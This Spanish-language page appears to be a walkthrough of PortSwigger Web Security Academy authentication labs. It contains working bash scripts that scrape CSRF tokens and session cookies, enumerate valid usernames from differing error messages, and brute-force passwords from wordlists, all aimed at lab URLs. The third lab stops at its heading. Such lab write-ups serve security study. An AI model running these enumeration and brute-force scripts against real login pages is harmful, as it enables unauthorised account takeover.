---
layout: default
title: "Authentication - PortSwigger"
permalink: /authentication-ps/
---

# Authentication - PortSwigger

## 1. Lab: Username enumeration via different responses

![Request HTTP](img1.png)

Extraemos los datos necesarios para hacer la consulta:	

```bash
https://aca61f111e1ff681806d1a2f00ed00e9.web-security-academy.net/login
csrf=JqMWKgtoS0cIGjdNp8PL3uY44N4xeePx&username=a&password=a
```

Escribimos un script en bash para solucionar el problema:

```bash
#!/bin/bash

URL='https://aca61f111e1ff681806d1a2f00ed00e9.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`;do
	DATA='csrf='$CSRF'&username='$USER'&password=a'
	RESULT=`curl $URL -d $DATA -b $COOKIE -s`
	
	if echo $RESULT | grep -o "Invalid username" > $NULL
	then
		echo "Incorrect user: $USER"
	else
		echo "Valid user: $USER"
		break
	fi
done
```

Ejecutamos el programa y vemos que valida un usuario.

![run script](img2.png)

Verificamos en la pagina, y vemos que si funciona.

![verify user](img3.png)

Ahora extendemos el script para probar con las contraseñas.

```bash
#!/bin/bash

URL='https://aca61f111e1ff681806d1a2f00ed00e9.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`;do
	DATA='csrf='$CSRF'&username='$USER'&password=a'
	RESULT=`curl $URL -d $DATA -b $COOKIE -s`

	if echo $RESULT | grep -o "Invalid username" > $NULL
	then
		echo "Incorrect user: $USER"
	else
		echo "Valid user: $USER"
		break
	fi
done

for PASS in `cat password.txt`;do
        DATA='csrf='$CSRF'&username='$USER'&password='$PASS
        RESULT=`curl $URL -d $DATA -b $COOKIE -s`

        if echo $RESULT | grep -o "Incorrect password" > $NULL
        then
                echo "Incorrect creds: $USER:$PASS"
        else
                echo "Valid creds: $USER:$PASS"
                break
        fi
done
```

Ejecutamos el nuevo script y obtenemos el resultado siguiente

![run script 2](img4.png)

Lo probamos en el sitio web para verificar si es cierto.

![test creds](img5.png)

Y para culminar con el laboratorio accedemos a la seccion **My account**.

![myacount](img6.png)

## 2. Lab: Username enumeration via subtly different responses

Para este ejercicio debemos de enumerar el usuario que tiene una variacion pequeña entre los errores.

![view](img7.png)

```bash
https://ac5f1f6e1e51c1a980554be900c700f2.web-security-academy.net/login
csrf=ok1ahDjlVNE1Q2ZHTa0wP5fZd6C8BtIN&username=a&password=a
```

Como nos dicen que hay una pequeña variacion en el mensaje de error, entonces vamos a pobrar con todo el payload completo de error el cual es **<p class=is-warning>Invalid username or password.</p>**

```bash
#!/bin/bash

URL='https://ac5f1f6e1e51c1a980554be900c700f2.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`;do

	DATA='csrf='$CSRF'&username='$USER'&password=a'
	RESULT=`curl $URL -d $DATA -b $COOKIE -s`
    
	if echo $RESULT | grep -F '<p class=is-warning>Invalid username or password.</p>' > $NULL
	#Fijarse que puse -F porque estaba considerando el . como una expresion regular
	then
		echo "Incorrect user: $USER"
	else
		echo "Valid user: $USER"
		break
	fi
done
```

Ejecutando el codigo obtenemos el usuario valido.

![run script](img8.png)

Ahora, agregamos el codigo suficiente para obtener la contraseña.

```bash
#!/bin/bash

URL='https://ac5f1f6e1e51c1a980554be900c700f2.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`;do
	DATA='csrf='$CSRF'&username='$USER'&password=a'
	RESULT=`curl $URL -d $DATA -b $COOKIE -s`
    
	if echo $RESULT | grep -F '<p class=is-warning>Invalid username or password.</p>' > $NULL
	then
		echo "Incorrect user: $USER"
	else
		echo "Valid user: $USER"
		break
	fi
done

for PASS in `cat password.txt`;do
        DATA='csrf='$CSRF'&username='$USER'&password='$PASS
        RESULT=`curl $URL -d $DATA -b $COOKIE -s`

        if echo $RESULT | grep -o "Invalid username or password" > $NULL
        then
                echo "Incorrect creds: $USER:$PASS"
        else
                echo "Valid creds: $USER:$PASS"
                break
        fi
done
```

Corremos el script y obtenemos las credenciales:

![run script](img9.png)

Nos logeamos e ingresamos a la seccion **My acount**.

![verify](img10.png)

## 3. Lab: Username enumeration via response timing